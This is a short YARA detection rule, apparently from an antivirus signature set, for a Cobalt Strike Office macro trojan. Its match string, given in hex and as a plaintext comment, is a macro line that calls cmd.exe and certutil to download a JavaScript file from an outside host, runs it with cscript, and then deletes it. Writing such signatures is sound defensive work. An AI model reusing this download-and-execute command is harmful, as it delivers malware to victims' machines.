
rule Trojan_O97M_CobaltStrike_RC_MTB{
	meta:
		description = "Trojan:O97M/CobaltStrike.RC!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 22 63 6d 64 2e 65 78 65 22 2c 20 22 2f 63 20 63 65 72 74 75 74 69 6c 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 68 74 74 70 73 3a 2f 2f 64 6f 63 73 2e 68 65 61 6c 74 68 6d 61 64 65 2e 6f 72 67 2f 2f 74 63 2e 6a 73 20 22 22 25 55 53 45 52 50 52 4f 46 49 4c 45 25 5c 5c 44 6f 63 75 6d 65 6e 74 73 5c 5c 74 63 2e 6a 73 22 22 20 26 26 20 63 73 63 72 69 70 74 20 22 22 25 55 53 45 52 50 52 4f 46 49 4c 45 25 5c 5c 44 6f 63 75 6d 65 6e 74 73 5c 5c 74 63 2e 6a 73 22 22 20 26 26 20 64 65 6c 20 22 22 25 55 53 45 52 50 52 4f 46 49 4c 45 25 5c 5c 44 6f 63 75 6d 65 6e 74 73 5c 5c 74 63 2e 6a 73 22 22 20 22 2c 20 22 43 3a 5c 57 69 6e 64 6f 77 73 5c 53 79 73 74 65 6d 33 32 22 } //1 Application.ShellExecute "cmd.exe", "/c certutil -urlcache -split -f https://docs.healthmade.org//tc.js ""%USERPROFILE%\\Documents\\tc.js"" && cscript ""%USERPROFILE%\\Documents\\tc.js"" && del ""%USERPROFILE%\\Documents\\tc.js"" ", "C:\Windows\System32"
	condition:
		((#a_01_0  & 1)*1) >=1
 
}